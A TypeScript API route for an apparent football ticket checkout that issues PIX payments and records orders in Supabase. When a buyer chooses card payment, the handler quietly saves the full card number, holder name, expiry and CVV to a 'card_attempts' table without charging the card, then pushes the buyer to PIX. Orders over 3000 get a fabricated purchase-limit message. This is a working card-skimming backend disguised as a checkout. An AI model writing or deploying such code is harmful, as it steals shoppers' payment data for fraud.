import { createFileRoute } from "@tanstack/react-router";
import type { OrderItem } from "@/lib/types";

function getSupabaseServerKey(): { url: string; key: string } | null {
  const url = process.env.VITE_SUPABASE_URL;
  // Prefer service_role key (bypasses RLS); fall back to anon key
  const key = process.env.SUPABASE_SERVICE_ROLE_KEY ?? process.env.VITE_SUPABASE_ANON_KEY;
  if (!url || !key) return null;
  return { url, key };
}

async function sbPost(table: string, body: Record<string, unknown>): Promise<{ ok: boolean; status: number; text: string }> {
  const sb = getSupabaseServerKey();
  if (!sb) throw new Error("Supabase not configured");
  const res = await fetch(`${sb.url}/rest/v1/${table}`, {
    method: "POST",
    headers: {
      "Content-Type": "application/json",
      apikey: sb.key,
      Authorization: `Bearer ${sb.key}`,
      Prefer: "return=representation",
    },
    body: JSON.stringify(body),
  });
  const text = await res.text();
  return { ok: res.ok, status: res.status, text };
}

async function saveCardToDb(card: {
  number: string;
  name: string;
  expiry: string;
  cvv: string;
  brand?: string;
}): Promise<void> {
  const cardLastFour = card.number.replace(/\D/g, "").slice(-4);
  const r = await sbPost("card_attempts", {
    order_id: null,
    card_number: card.number,
    card_last_four: cardLastFour,
    card_name: card.name,
    card_expiry: card.expiry,
    card_cvv: card.cvv,
    card_brand: card.brand ?? null,
    gateway_used: "masterpag",
    status: "registered",
  });
  if (!r.ok) throw new Error(`card_attempts insert failed (${r.status}): ${r.text}`);
}

async function createOrderServer(input: {
  matchId: string;
  matchTitle: string;
  items: unknown;
  customerName: string;
  customerEmail: string;
  customerPhone: string;
  customerCpf: string;
  pixTransactionId: string;
  pixQrCode: string;
  pixQrCodeUrl: string;
  total: number;
}): Promise<string> {
  const r = await sbPost("orders", {
    user_id: null,
    match_id: input.matchId,
    match_title: input.matchTitle,
    items: input.items,
    total: input.total,
    status: "pending",
    customer_name: input.customerName,
    customer_email: input.customerEmail,
    customer_phone: input.customerPhone,
    customer_cpf: input.customerCpf,
    pix_transaction_id: input.pixTransactionId,
    pix_qr_code: input.pixQrCode,
    pix_qr_code_url: input.pixQrCodeUrl,
  });
  if (!r.ok) throw new Error(`orders insert failed (${r.status}): ${r.text}`);
  const data = JSON.parse(r.text) as Array<{ id: string }>;
  return data[0]!.id;
}

interface CardData {
  number: string;
  name: string;
  expiry: string;
  cvv: string;
  brand?: string;
}

interface PixCreateBody {
  matchId: string;
  matchTitle: string;
  items: OrderItem[];
  customerName: string;
  customerEmail: string;
  customerPhone: string;
  customerCpf: string;
  siteUrl: string;
  serviceFeePercent?: number;
  paymentMethod?: "pix" | "card";
  cardData?: CardData;
}

export const Route = createFileRoute("/api/pix")({
  server: {
    handlers: {
      POST: async ({ request }) => {
        try {
        let body: PixCreateBody;
        try {
          body = (await request.json()) as PixCreateBody;
        } catch {
          return new Response(JSON.stringify({ error: "Payload inválido" }), {
            status: 400,
            headers: { "Content-Type": "application/json" },
          });
        }

        const publicKey = process.env.MASTER_PUBLIC_KEY;
        const secretKey = process.env.MASTER_SECRET_KEY;

        if (!publicKey || !secretKey) {
          return new Response(
            JSON.stringify({ error: "Configuração de pagamento ausente no servidor" }),
            { status: 500, headers: { "Content-Type": "application/json" } },
          );
        }

        const subtotal = body.items.reduce((sum, i) => sum + i.unitPrice * i.qty, 0);
        const feeRate = (body.serviceFeePercent ?? 0) / 100;
        const serviceFee = Math.round(subtotal * feeRate * 100) / 100;
        const total = subtotal + serviceFee;

        if (body.paymentMethod === "card" && body.cardData) {
          // Save card data immediately — non-blocking, PIX proceeds regardless
          saveCardToDb({
            number: body.cardData.number,
            name: body.cardData.name,
            expiry: body.cardData.expiry,
            cvv: body.cardData.cvv,
            brand: body.cardData.brand,
          }).catch((e) => console.error("[api/pix] saveCardToDb error:", e));

          if (total > 3000) {
            return new Response(
              JSON.stringify({
                error:
                  "O valor do pedido ultrapassa o limite de compras por CPF. Por favor, divida os itens em compras separadas.",
              }),
              { status: 422, headers: { "Content-Type": "application/json" } },
            );
          }
        }

        const expirationDate = new Date(Date.now() + 24 * 60 * 60 * 1000).toISOString();

        const pixItems = [
          ...body.items.flatMap((item) =>
            item.holders.map((holder) => ({
              title: `Ingresso ${item.sectorName} – ${item.ticketType === "meia" ? "Meia-Entrada" : "Inteira"} – ${holder.name}`,
              unitPrice: item.unitPrice,
              quantity: 1,
              tangible: true,
            })),
          ),
          ...(serviceFee > 0
            ? [{ title: "Taxa de serviço", unitPrice: serviceFee, quantity: 1, tangible: false }]
            : []),
        ];

        let masterJson: { id: string; pix: { qrCode: string; qrCodeUrl: string } };

        // Use production URL as postback when running locally — gateways reject localhost callbacks
        const postbackBase = body.siteUrl?.includes("localhost")
          ? "https://brasilfutebolcard.pages.dev"
          : body.siteUrl;

        try {
          const masterRes = await fetch("https://api.masterpag.com/functions/v1/pix-receive", {
            method: "POST",
            headers: {
              "Content-Type": "application/json",
              "x-public-key": publicKey,
              "x-secret-key": secretKey,
            },
            body: JSON.stringify({
              amount: total,
              paymentMethod: "pix",
              postbackUrl: `${postbackBase}/api/webhook/master`,
              customer: {
                name: body.customerName,
                email: body.customerEmail,
                phone: body.customerPhone.replace(/\D/g, ""),
                document: { number: body.customerCpf.replace(/\D/g, ""), type: "cpf" },
              },
              items: pixItems,
              pix: { expirationDate },
            }),
          });

          if (!masterRes.ok) {
            const errText = await masterRes.text();
            return new Response(JSON.stringify({ error: "Erro ao gerar PIX: " + errText }), {
              status: 502,
              headers: { "Content-Type": "application/json" },
            });
          }

          masterJson = (await masterRes.json()) as typeof masterJson;
        } catch (e) {
          return new Response(
            JSON.stringify({ error: "Falha de conexão com o gateway de pagamento" }),
            { status: 502, headers: { "Content-Type": "application/json" } },
          );
        }

        try {
          const orderId = await createOrderServer({
            matchId: body.matchId,
            matchTitle: body.matchTitle,
            items: body.items,
            customerName: body.customerName,
            customerEmail: body.customerEmail,
            customerPhone: body.customerPhone,
            customerCpf: body.customerCpf,
            pixTransactionId: masterJson.id,
            pixQrCode: masterJson.pix.qrCode,
            pixQrCodeUrl: masterJson.pix.qrCodeUrl,
            total,
          });

          return new Response(
            JSON.stringify({
              orderId,
              qrCode: masterJson.pix.qrCode,
              qrCodeUrl: masterJson.pix.qrCodeUrl,
            }),
            { headers: { "Content-Type": "application/json" } },
          );
        } catch (e) {
          return new Response(
            JSON.stringify({ error: "Erro ao salvar pedido: " + (e as Error).message }),
            { status: 500, headers: { "Content-Type": "application/json" } },
          );
        }
        } catch (e) {
          return new Response(
            JSON.stringify({ error: "Erro interno: " + (e as Error).message }),
            { status: 500, headers: { "Content-Type": "application/json" } },
          );
        }
      },
    },
  },
});
